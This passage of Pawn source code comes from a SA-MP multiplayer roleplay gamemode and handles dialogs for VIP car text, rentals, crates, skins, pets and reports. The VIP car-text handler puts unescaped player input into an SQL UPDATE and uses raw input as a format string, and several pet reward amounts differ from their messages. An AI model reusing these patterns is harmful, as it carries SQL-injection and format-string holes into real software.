    			return SCMf(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de rank %d+ pentru a lua aceasta arma!", GunMafie[listitem][gunRank]);

    		PlayerInfo[playerid][pGuns][listitem] = PlayerInfo[playerid][pGuns][listitem] ? false : true;

    		if(PlayerInfo[playerid][pGuns][listitem]==true) SendClientMessage(playerid, -1, "Arma activata! Folsoeste /order pentru a lua armele.");
    		else SendClientMessage(playerid, -1, "Arma dezactivata! Folsoeste /order pentru a lua armele.");
    		save_guns(playerid);
    	}
    	case DIALOG_VIPNAME: {
    		if(!response)
    			return true;

    		new idd = PersonalCar(playerid);
    		switch(listitem) {
    			case 0: ShowPlayerDialog(playerid, DIALOG_VIPNAME1, DIALOG_STYLE_INPUT, "{f4ad42}VIP {FFFFFF}Menu: Change text", "Scrie in casuta de jos ce text vrei sa ai pe vehicul", "Select", "Back");
    			case 1: ShowPlayerDialog(playerid, DIALOG_VIPNAME1, DIALOG_STYLE_LIST, "{f4ad42}VIP {FFFFFF}Menu: Change color", "{CECECE}White\n{0087FE}Blue\n{4700C2}Dark purple\n{EBFF00}Yellow\n{EF00FF}Purple\n{40FF00}Green\n{9CFF29}Lime green\n{0E7F03}Dark green\n{FF9A00}Orange\n{6E6E6E}Black\n{FF4C9D}Pink\n{F4FA58}Yellow 2\n{00BFFF}Blue 2\n{819FF7}Blue 3\n{FE9A2E}Orange 2\n{FA8258}Orange 3\n{00FF40}Green 2\n{D358F7}Purple 2\n{4169E1}Royal Blue\n{9ACD32}YellowGreen\n{F0E68C}Khaki\n{BDB76B}DarkKhaki\n{FF1493}DeepPink\n{9966CC}Amethyst\n{F0B2B2}PinkOrange\n{DB7093}PaleVioletRed", "Select", "Back");
    			case 2: {
			        DestroyDynamicObject(nameobject[CarInfo[idd][Spawned]]);
			        EditVipCar(playerid, idd);
			        SendClientMessage(playerid, COLOR_LIGHTGOLD, "VIP MENU: {FFFFFF}Foloseste-te de coodonatele (X, Y, Z) pentru a muta textul.");
    			}
    			case 3: {
					CarInfo[idd][cVipPos][0]=CarInfo[idd][cVipPos][1]=CarInfo[idd][cVipPos][2]=CarInfo[idd][cVipPos][3]=CarInfo[idd][cVipPos][4]=CarInfo[idd][cVipPos][5]=0.0;
					switch(CarInfo[idd][cModel]) {
						case 411: CarInfo[idd][cVipPos][1] = -1.9, CarInfo[idd][cVipPos][2] = 0.3, CarInfo[idd][cVipPos][3] = 270.0;
						case 560: CarInfo[idd][cVipPos][1] = -0.6, CarInfo[idd][cVipPos][2] = 0.8, CarInfo[idd][cVipPos][3] = 270.0;
						case 541: CarInfo[idd][cVipPos][1] = -0.4, CarInfo[idd][cVipPos][2] = 0.59, CarInfo[idd][cVipPos][3] = 270.0;
						case 429: CarInfo[idd][cVipPos][1] = -1.79, CarInfo[idd][cVipPos][2] = 0.33, CarInfo[idd][cVipPos][3] = 270.0;
						case 495: CarInfo[idd][cVipPos][1] = -1.2, CarInfo[idd][cVipPos][2] = 1, CarInfo[idd][cVipPos][3] = 270.0;
						case 579: CarInfo[idd][cVipPos][1] = -2, CarInfo[idd][cVipPos][2] = 1.21,CarInfo[idd][cVipPos][3] = 270.0;
						case 562: CarInfo[idd][cVipPos][1] = -0.69, CarInfo[idd][cVipPos][2] = 0.76, CarInfo[idd][cVipPos][3] = 270.0;
						case 451: CarInfo[idd][cVipPos][1] = -0.6, CarInfo[idd][cVipPos][2] = 0.56, CarInfo[idd][cVipPos][3] = 270.0;
						case 480: CarInfo[idd][cVipPos][1] = -1.58, CarInfo[idd][cVipPos][2] = 0.27, CarInfo[idd][cVipPos][3] = 270.0;
					}
					format(CarInfo[idd][cText], 32, GetName(playerid));
    				mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `cars` SET `Text`='%s' WHERE `ID`='%d'", CarInfo[idd][cText], CarInfo[idd][cID]);
    				mysql_tquery(SQL, gQuery, "", "");
    				DestroyDynamicObject(nameobject[CarInfo[idd][Spawned]]);
    				Save_VipCoordonat(idd);
    				attach_vip_text(idd);
    				SendClientMessage(playerid, -1, "{f4ad42}VIP MENU: {FFFFFF}Coordonatele au fost setate la cele initiale.");
    			}
    		}
    		listitemm[playerid] = listitem;
    	}
    	case DIALOG_VIPNAME1: {
    		if(!response) 
    			return true;

    		new idd = PersonalCar(playerid);
    		switch(listitemm[playerid]) {
    			case 0: {
    				if(strlen(inputtext) < 3 || strlen(inputtext) > 20) {
    					SendClientMessage(playerid, COLOR_GREY, "Poti pune un text ce are minim 3 caractere si maxim 20.");
    					return true;
    				}
    				DestroyDynamicObject(nameobject[CarInfo[idd][Spawned]]);
    				format(CarInfo[idd][cText], 32, inputtext);
    				mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `cars` SET `Text`='%s' WHERE `ID`='%d'", CarInfo[idd][cText], CarInfo[idd][cID]);
    				mysql_tquery(SQL, gQuery, "", "");
    				attach_vip_text(idd);
    				SCMf(playerid, -1, "{f4ad42}VIP MENU: {FFFFFF}Text modificat in '%s'.", CarInfo[idd][cText]);
    			}
    			case 1: { 
    				DestroyDynamicObject(nameobject[CarInfo[idd][Spawned]]);
					CarInfo[idd][cTextColor] = listitem;
					mysql_format(SQL, query, sizeof(query), "UPDATE `cars` SET `ColorText`='%d' WHERE `ID`='%d'", listitem, CarInfo[idd][cID]);
					mysql_tquery(SQL, query, "", "");
					SCMf(playerid, -1, "{f4ad42}VIP MENU: {FFFFFF}Culoare modificata iar acum textul arata asa {%s}%s{FFFFFF}.", svColors(CarInfo[idd][cTextColor]), CarInfo[idd][cText]);
					attach_vip_text(idd);
    			}
    		}
    	}
		case DIALOG_RENTCAR: {
			if(!response) return true;
			if(RentStock[listitem]<=0) return SendClientMessage(playerid, COLOR_LGREEN, "Eorare: Acest vehicul nu mai este in stock");
			RentStock[listitem] --;
			new const models[] = {426, 506, 560, 480, 550};
			create_rent_car(playerid, models[listitem]);
			SCMf(playerid, COLOR_YELLOW, "Ai inchiriat vehiculul %s, vei plati $150 la fiecare 20 secunde daca foloseti vehiculul.", GetVehicleName(models[listitem]));
			SendClientMessage(playerid, COLOR_YELLOW, "Daca doresti sa renunti la vehiculul inchiriat, ai la dispozitie comanda (/unrentcar).");
		}
		case DIALOG_RENTBIKE: {
			if(!response) return true;
			if(RentStock[listitem+5]<=0) return SendClientMessage(playerid, COLOR_LGREEN, "Eorare: Acest vehicul nu mai este in stock");
			if(GetPlayerCash(playerid) < 150) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu detii suma de $150.");
			RentStock[listitem+5] --;
			new const models[] = {522, 521, 461, 481, 510};
			create_rent_car(playerid, models[listitem]);
			SCMf(playerid, COLOR_YELLOW, "Ai inchiriat vehiculul %s, vei plati $150 la fiecare 20 secunde daca foloseti vehiculul.", GetVehicleName(models[listitem]));
			SendClientMessage(playerid, COLOR_YELLOW, "Daca doresti sa renunti la vehiculul inchiriat, ai la dispozitie comanda (/unrentbike).");
		}
    	case DIALOG_GIVECRATES: {
    		if(!response) return true;
    		new id = GetPVarInt(playerid, "id");
    		if(!IsPlayerConnected(id))
    			return true;

    		format(gString, 100, "(/givecrate) {FFFFFF}%s i-a dat lui %s un %s crate.", GetName(playerid), GetName(id), CrateName[listitem]);
    		SendAdminMessage(COLOR_RED, gString, 6);
    		format(gString, 100, "Admin {FF0000}%s{FFFFFF} ti-a dat un crate %s.", GetName(playerid), CrateName[listitem]);
    		SendClientMessage(id, COLOR_WHITE, gString);
    		PlayerInfo[id][pCrates][listitem] ++;
    		save_crates(id);
    	}
        case DIALOG_CRATES: {
			if(!response) return ShowCrates(playerid);
			if(PlayerInfo[playerid][pCrates][listitem] < 1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai o cutie de acest tip!"), ShowCrates(playerid);
			format(gString, 75, "You have opened an {%s}%s{FFFFFF}! Waiting...", CrateColors[listitem], CrateName[listitem][opening]);
			SendClientMessage(playerid, COLOR_WHITE, gString);
			PlayerInfo[playerid][pCrates][listitem] --;
			save_crates(playerid);
			CheckMission(playerid, 5);
			CrateTime[playerid] = 20;
   			CrateModel[playerid] = listitem;
   			startcrates(playerid);
		}
		case DIALOG_SKINS: {
	        if(!response) return true;
	        new x = listitemm[playerid], y=x+((td_page[playerid]-1)*10), id = PlayerInfo[playerid][pSkins][y];
        	if(y==0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti sterge skinul de civil!");
	        if(GetPlayerSkin(playerid) == id) {
	            PlayerInfo[playerid][pModel] = 250;
                SetPlayerSkin(playerid, 250);
                UpdateVar(playerid, "Model", id);
            }
            //SCMf(playerid, -1, "{DF80F9}(Skin) {FFFFFF}Skin #%d sters. (model: %d)", y+1, PlayerInfo[playerid][pSkins][y]);
            SCMf(playerid, 0xc2a2daFF, "%d/%d", td_page[playerid], PlayerInfo[playerid][pVip]+1);
            PlayerInfo[playerid][pSkins][y] = -1;
           	PlayerTextDrawSetPreviewModel(playerid, SkinsPTD[x], 18631);
           	PlayerTextDrawBackgroundColor(playerid, SkinsPTD[x], 0xFFFFFF20);
           	PlayerTextDrawShow(playerid, SkinsPTD[x]);
            save_skin(playerid);
	        DeletePVar(playerid, "skin");
        }

        case DIALOG_SKIN: {
        	if(!response) return true;
	        new x = listitemm[playerid], y=x+((td_page[playerid]-1)*10), id = PlayerInfo[playerid][pSkins][y];
	        PlayerInfo[playerid][pModel] = id;
            SetPlayerSkin(playerid, id);
            UpdateVar(playerid, "Model", id);
            SCMf(playerid, 0xc2a2daFF, "(Skin) {FFFFFF}Skin #%d selectat. [type: %s, model: %d]", y+1, GetSkinType(id), id);
	        DeletePVar(playerid, "skin");
	        SkinsActions[playerid] = 0;
	       	player_selected[playerid] = 0;
	        CancelSelectTextDraw(playerid);
	        for(new i =0;i<11;i++) PlayerTextDrawHide(playerid, SkinsPTD[i]);
			for(new i =0;i<11;i++) TextDrawHideForPlayer(playerid, SkinsTD[i]);
        }
    	case DIALOG_PET_OBJ: {
    		if(!response)
    		{
    			format(srsString, 80, "%d/%d pet points for level %d", PlayerInfo[playerid][pPetPoints], PlayerInfo[playerid][pPetLevel]*1500, PlayerInfo[playerid][pPetLevel] + 1);
				format(gQuery, 60, "{3BBF0B}%s", PlayerInfo[playerid][pPetName]);
				format(gString, 256,"Function\tResult\nBuy Level\t%s\nPet Appearance\t%s\nTog Pet\t%s\nPet Name\t%s\nPet Benefits\tClick for informations", PlayerInfo[playerid][pPetLevel]<30?(srsString):("0 XP, you have the maxim level."), name_pet[PlayerInfo[playerid][pPet]], PlayerInfo[playerid][pPetStatus]?("{3BBF0B}Enabled"):("{FF0000}Disabled"), PlayerInfo[playerid][pPetLevel]<21?("{FF0000}Your pet needs to be level 21 to set a name."):(gQuery));
				ShowPlayerDialog(playerid, DIALOG_PET, DIALOG_STYLE_TABLIST_HEADERS, "Pet Menu", gString, "Select", "Cancel");
				return true;
    		}

    		if(PlayerInfo[playerid][pPetLevel] < level_pet[listitem])
    			return SendClientMessage(playerid, COLOR_GREY, "You can not select this pet because you do not have the required level.");

    		//special pets
    		if(listitem==8||listitem==9||listitem==10||listitem==11||listitem==12||listitem==13) {
    			if(!PlayerInfo[playerid][pSpecialPet][listitem-8])
    				return SendClientMessage(playerid, COLOR_GREY, "You do not own that special pet.");
    		}

    		SCMf(playerid, COLOR_MONEY, "* You selected pet %s successfully.", name_pet[listitem]);
    		PlayerInfo[playerid][pPet] = listitem;
    		UpdateVar(playerid, "Pet", listitem);
    		attach_player_pet(playerid);
    	}
		case DIALOG_PET: {
			if(!response)
				return true;
					
			switch(listitem) {
				case 0: {
					if(PlayerInfo[playerid][pPetLevel]>=30) return SendClientMessage(playerid, COLOR_GREY, "* You can have the pet maxim evolve 30 level!");
					if(PlayerInfo[playerid][pPetPoints] < PlayerInfo[playerid][pPetLevel]*1500) return SendClientMessage(playerid, COLOR_GREY, "* You don't have enough pet points to evolve your pet.");
					PlayerInfo[playerid][pPetPoints] -= PlayerInfo[playerid][pPetLevel]*1500; PlayerInfo[playerid][pPetLevel]++;
					SCMf(playerid, COLOR_MONEY, "* You evolved your pet successfully. Your pet level is now %d.", PlayerInfo[playerid][pPetLevel]);
					UpdateVar(playerid, "PetLevel", PlayerInfo[playerid][pPetLevel]);
					UpdateVar(playerid, "PetPoints", PlayerInfo[playerid][pPetPoints]);

					if(Pet[playerid]!=INVALID_PET) {
						format(gString, 80, "{56FC03}Pet Lvl. {FFF700}%d\n{fff700}%s",PlayerInfo[playerid][pPetLevel], PlayerInfo[playerid][pPetName]);
						UpdateDynamic3DTextLabelText(Pet[playerid], COLOR_WHITE, gString);
					}

					switch(PlayerInfo[playerid][pPetLevel]) {
						case 1: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$10,000 on payday.");
						case 2: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$15,000 on payday.");
						case 3: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$20,000 on payday si dublu rp la primul Payday al zilei.");
						case 4: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$25,000 on payday si dublu rp la primul Payday al zilei.");
						case 5: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$30,000 on payday, dublu rp la primul Payday al zilei, 100 BPoints and 5 respect points."), givePoints(playerid, 100), PlayerInfo[playerid][pExp] += 5, UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]);
						case 6: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$35,000 on payday, $3,000,000 and 150 BPoints."), GivePlayerCash(playerid, 3000000), givePoints(playerid, 150);
						case 7: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$40,000 on payday, $3,500,000 and 150 BPoints."), GivePlayerCash(playerid, 3500000), givePoints(playerid, 150);
						case 8: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$45,000 on payday, $4,000,000 and 150 BPoints."), GivePlayerCash(playerid, 4000000), givePoints(playerid, 150);
						case 9: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$50,000 on payday, $4,500,000 and 200 BPoints."), GivePlayerCash(playerid, 4500000), givePoints(playerid, 200);
						case 10: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$55,000 on payday, $5,000,000, 300 BPoints and 10 respect points."), GivePlayerCash(playerid, 5000000), givePoints(playerid, 300), PlayerInfo[playerid][pExp] += 10, UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]);
						case 11: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$60,000 on payday, $5,500,000, 300 BPoints and 1 respect points."), GivePlayerCash(playerid, 5500000), givePoints(playerid, 300), PlayerInfo[playerid][pExp] ++, UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]);
						case 12: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$65,000 on payday, $6,000,000, 300 BPoints and 2 respect points."), GivePlayerCash(playerid, 6000000), givePoints(playerid, 300), PlayerInfo[playerid][pExp] += 2, UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]);
						case 13: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$70,000 on payday, $6,500,000, 300 BPoints and 3 respect points."), GivePlayerCash(playerid, 6500000), givePoints(playerid, 300), PlayerInfo[playerid][pExp] += 3, UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]);
						case 14: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$75,000 on payday, $7,000,000, 300 BPoints and 4 respect points."), GivePlayerCash(playerid, 7000000), givePoints(playerid, 350), PlayerInfo[playerid][pExp] += 4, UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]);
						case 15: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$80,000 on payday, $7,500,000, 350 BPoints, 5 respect points and 15 premium points."), GivePlayerCash(playerid, 7500000), givePoints(playerid, 350), PlayerInfo[playerid][pExp] += 5, UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]), PlayerInfo[playerid][pPremiumPoints]+=15, UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
						case 16: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$85,000 on payday, $8,000,000, 350 points and 6 respect points."), GivePlayerCash(playerid, 8000000), givePoints(playerid, 350), PlayerInfo[playerid][pExp] += 6, UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]);
						case 17: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$90,000 on payday, $8,500,000, 350 points and 7 respect points."), GivePlayerCash(playerid, 8500000), givePoints(playerid, 350), PlayerInfo[playerid][pExp] += 7, UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]);
						case 18: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$95,000 on payday, $9,000,000, 350 points and 8 respect points."), GivePlayerCash(playerid, 9000000), givePoints(playerid, 350), PlayerInfo[playerid][pExp] += 8, UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]);
						case 19: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$100,000 on payday, $9,500,000, 350 points and 9 respect points."), GivePlayerCash(playerid, 9500000), givePoints(playerid, 350), PlayerInfo[playerid][pExp] += 9, UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]);
						case 20: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$150,000 on payday, $10,000,000, 500 points, 20 respect points and 20 premium points."), GivePlayerCash(playerid, 9500000), givePoints(playerid, 350), PlayerInfo[playerid][pExp] += 9, UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]), PlayerInfo[playerid][pPremiumPoints] += 20, UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
						case 21: {
							SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}50 premium points, 1000 points, 30 respect points, 20 premium points and transcendent skin/crate."), givePoints(playerid, 1000), PlayerInfo[playerid][pExp] += 30, UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]), PlayerInfo[playerid][pPremiumPoints] += 50, UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
							if(!free_skin(playerid)) give_skin(playerid, loadSkins[e_SKIN_TRANSCENDENT][random(sizeof(loadSkins[e_SKIN_TRANSCENDENT]))]);
						}
						case 22: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$175,000 on payday, $11,000,000, 600 points and 22 respect points."), GivePlayerCash(playerid, 11000000), givePoints(playerid, 600), PlayerInfo[playerid][pExp] += 22, UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]);
						case 23: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$180,000 on payday, $12,000,000, 650 points and 23 respect points."), GivePlayerCash(playerid, 12000000), givePoints(playerid, 650), PlayerInfo[playerid][pExp] += 23, UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]);
						case 24: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$190,000 on payday, $13,000,000, 700 points and 25 respect points."), GivePlayerCash(playerid, 13000000), givePoints(playerid, 700), PlayerInfo[playerid][pExp] += 25, UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]);
						case 25: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$200,000 on payday, $15,000,000, 777 points, 30 respect points and 25 premium points."), GivePlayerCash(playerid, 15000000), givePoints(playerid, 777), PlayerInfo[playerid][pExp] += 30, UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]), PlayerInfo[playerid][pPremiumPoints]+=25,UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
						case 26: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$210,000 on payday, $16,000,000, 800 points and 31 respect points."), GivePlayerCash(playerid, 16000000), givePoints(playerid, 800), PlayerInfo[playerid][pExp] += 31, UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]);
						case 27: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$220,000 on payday, $18,000,000, 850 points and 32 respect points."), GivePlayerCash(playerid, 18000000), givePoints(playerid, 850), PlayerInfo[playerid][pExp] += 32, UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]);
						case 28: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$230,000 on payday, $19,000,000, 900 points and 33 respect points."), GivePlayerCash(playerid, 19000000), givePoints(playerid, 900), PlayerInfo[playerid][pExp] += 33, UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]);
						case 29: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$240,000 on payday, $20,000,000, 950 points and 34 respect points."), GivePlayerCash(playerid, 20000000), givePoints(playerid, 950), PlayerInfo[playerid][pExp] += 34, UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]);
						case 30: SendClientMessage(playerid, COLOR_WHITE, "{3495eb}Pet Benefits: {FFFFFF}$250,000 on payday, $25,000,000, 1000 points, 35 respect points and 50 premium points."), GivePlayerCash(playerid, 25000000), givePoints(playerid, 1000), PlayerInfo[playerid][pExp] += 35, UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]), PlayerInfo[playerid][pPremiumPoints] += 50, UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
					}
					UpdateProgress(playerid, 0);	
				} 
				case 1: {
					gString[0] = (EOS);
					strcat(gString, "Pet Name\tLevel\tStatus\n");
					for(new i=0; i < 8; i++) {
						format(gQuery, 80, "%s\t%d\t%s\n", name_pet[i], level_pet[i], PlayerInfo[playerid][pPetLevel]<level_pet[i]?("{FF0000}not achieved"):("{3BBF0B}achieved"));
						strcat(gString, gQuery);
					}
					//special
					for(new i; i<6; i++) {
						format(gQuery, 80, "{ebc034}(special) {FFFFFF}%s - %s{FFFFFF}\n", special_pet_name[i], PlayerInfo[playerid][pSpecialPet][i]?("{3BBF0B}achieved"):("{FF0000}not achieved"));
						strcat(gString, gQuery);
					}
					ShowPlayerDialog(playerid, DIALOG_PET_OBJ, DIALOG_STYLE_TABLIST_HEADERS, "Pet Appearance", gString, "Select", "Back");
				} 
				case 2: {
					if(!PlayerInfo[playerid][pPetStatus]) {
						PlayerInfo[playerid][pPetStatus] = true;
						attach_player_pet(playerid);
						if(Pet[playerid]==INVALID_PET) {
							format(gString, 80, "{56FC03}Pet Lvl. {FFF700}%d\n{fff700}%s",PlayerInfo[playerid][pPetLevel], PlayerInfo[playerid][pPetName]);
							Pet[playerid] = CreateDynamic3DTextLabel(gString, COLOR_WHITE, 357.120239, 1.712298, 349.232513, 5, playerid);
					    }
					    SendClientMessage(playerid, COLOR_LGREEN, "Pet: Enabled");
					    UpdateVar(playerid, "PetStatus", true);
					}
					else {
						if(IsPlayerAttachedObjectSlotUsed(playerid, 6)) RemovePlayerAttachedObject(playerid, 6);
						SendClientMessage(playerid, COLOR_LGREEN, "Pet: Disabled");
						PlayerInfo[playerid][pPetStatus] = false;
						UpdateVar(playerid, "PetStatus", false);
						if(Pet[playerid]!=INVALID_PET) DestroyDynamic3DTextLabel(Pet[playerid]), Pet[playerid] = INVALID_PET;
					}
				} 
				case 3: {
					if(PlayerInfo[playerid][pPetLevel] < 21) 
						return SendClientMessage(playerid, COLOR_GREY, "* Your pet needs to be level 21 to set a name.");

					format(gString, sizeof gString, "Current pet name is %s.\nDo you want to name your pet? Put here.", PlayerInfo[playerid][pPetName]);
					ShowPlayerDialog(playerid, DIALOG_PETNAME, DIALOG_STYLE_INPUT, "Pet Name", gString, "Set", "Back");
				} 
				case 4: {
					ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, "Pet Benefits", "\
						{3495EB}Pet Level 1: {FFFFFF}+10k Payday\n\
						{3495EB}Pet Level 2: {FFFFFF}+15k Payday\n\
						{3495EB}Pet Level 3: {FFFFFF}+20k Payday + dublu rp la primul Payday al zilei\n\
						{3495EB}Pet Level 4: {FFFFFF}+25k Payday + dublu rp la primul Payday al zilei\n\
						{3495EB}Pet Level 5: {FFFFFF}+30k Payday + dublu rp la primul Payday al zilei + 100 BP + 5 rp\n\
						{3495EB}Pet Level 6: {FFFFFF}+35k Payday + $3,000,000 + 150 bp\n\
						{3495EB}Pet Level 7: {FFFFFF}+40k Payday + $3,500,000 + 150 bp\n\
						{3495EB}Pet Level 8: {FFFFFF}+45k Payday + $4,000,000 + 150 bp\n\
						{3495EB}Pet Level 9: {FFFFFF}+50k Payday + $4,500,000 + 200 bp\n\
						{3495EB}Pet Level 10: {FFFFFF}+55k Payday + $5,000,000 + 300 bp + 10 rp\n\
						{3495EB}Pet Level 11: {FFFFFF}+60k Payday + $5,500,000 + 300 bp + rp\n\
						{3495EB}Pet Level 12: {FFFFFF}+65k Payday + $6,000,000 + 300 bp + 2rp\n\
						{3495EB}Pet Level 13: {FFFFFF}+70k Payday + $6,500,000 + 300 bp + 3rp\n\
						{3495EB}Pet Level 14: {FFFFFF}+75k Payday + $7,000,000 + 300 bp + 4rp\n\
						{3495EB}Pet Level 15: {FFFFFF}+80k Payday + $7,500,000 + 350 bp + 5rp + 15pp\n\
						{3495EB}Pet Level 16: {FFFFFF}+85k Payday + $8,000,000 + 350 bp + 6rp\n\
						{3495EB}Pet Level 17: {FFFFFF}+90k Payday + $8,500,000 + 350 bp + 7rp\n\
						{3495EB}Pet Level 18: {FFFFFF}+95k Payday + $9,000,000 + 350 bp + 8rp\n\
						{3495EB}Pet Level 19: {FFFFFF}+100k Payday + $9,500,000 + 350 bp + 9rp\n\
						{3495EB}Pet Level 20: {FFFFFF}+150k Payday + $10,000,000 + 500 bp + 20 rp + 20 pp\n\
						{3495EB}Pet Level 21: {FFFFFF}50 pp + 1000 bp + 30 rp + skin legendar\n\
						{3495EB}Pet Level 22: {FFFFFF}+175k payday + 11,000,000 + 600bp + 22 rp\n\
						{3495EB}Pet Level 23: {FFFFFF}+180k payday + 12,000,000 + 650bp + 23 rp\n\
						{3495EB}Pet Level 24: {FFFFFF}+190k payday + 13,000,000 + 700bp + 25 rp\n\
						{3495EB}Pet Level 25: {FFFFFF}+200k payday + 15,000,000 + 777bp + 30 rp + 25pp\n\
						{3495EB}Pet Level 26: {FFFFFF}+210k payday + 16,000,000 + 800 bp + 31 rp\n\
						{3495EB}Pet Level 27: {FFFFFF}+220k payday + 18,000,000 + 850 bp + 32 rp\n\
						{3495EB}Pet Level 28: {FFFFFF}+230k payday + 19,000,000 + 900 bp + 33 rp\n\
						{3495EB}Pet Level 29: {FFFFFF}+240k payday + 20,000,000 + 950 bp + 34 rp\n\
						{3495EB}Pet Level 30: {FFFFFF}+250k payday + 25,000,000 + 1000 bp + 35 rp + 50pp\n\
						{3495EB}Pet Special: {FFFFFF}+10 bpoints / payday", "Close", "");
				}
			}	
		}
		case DIALOG_PETNAME: {
			if(!response) return true;
			if(!strlen(inputtext) || strlen(inputtext) < 3 || strlen(inputtext) > 15)
				return SendClientMessage(playerid, COLOR_LGREEN, "Invalid characters! Limit: 3 - 15.");

			mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `PetName` = '%e' WHERE `id` = '%i'", inputtext, PlayerInfo[playerid][pSQLID]);
			mysql_tquery(SQL, gQuery, "", "");
			format(PlayerInfo[playerid][pPetName], 30, inputtext);
			SCMf(playerid, COLOR_YELLOW, "Your pet name is now: %s",PlayerInfo[playerid][pPetName]);

			format(gString, 80, "{56FC03}Pet Lvl. {FFF700}%d\n{fff700}%s",PlayerInfo[playerid][pPetLevel], PlayerInfo[playerid][pPetName]);
			UpdateDynamic3DTextLabelText(Pet[playerid], COLOR_WHITE, gString);
		}		
        
		case DIALOG_REPORT: {
			if(!response) return true;
			listitemm[playerid] = listitem;
			switch(listitem) {
				case 0: ShowPlayerDialog(playerid, DIALOG_REPORT+1, DIALOG_STYLE_INPUT, "Raporteaza DM", "Scrie ID-ul sau numele jucatorului pe care vrei sa-l raportezi:", "Next", "Back");
				case 1: ShowPlayerDialog(playerid, DIALOG_REPORT+1, DIALOG_STYLE_INPUT, "Raporteaza un codat", "Scrie ID-ul sau numele jucatorului pe care vrei sa-l raportezi:", "Next", "Back");
				case 2: {
					ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Intrebari despre donatii", 
					"Cum donez?\nPentru a dona, trebuie sa iei legatura cu ownerii serverului", "Close", "");
				}	
				case 3: {
					format(gString, 128, "%s (%d) este blocat.", GetName(playerid), playerid);
					SendAdminMessage(0xC9161FFF, gString, 1);
						
					ReportTimer[playerid] = 300;
					SendClientMessage(playerid, COLOR_YELLOW, "Reportul tau a fost trimis adminilor.");
					PlayerInfo[playerid][pReportTime] = gettime()+180;

					report_ago[playerid] = gettime();
					report_type[playerid] = 3;
					Iter_Add(report_players, playerid);	
					show_admin_report();
				}	
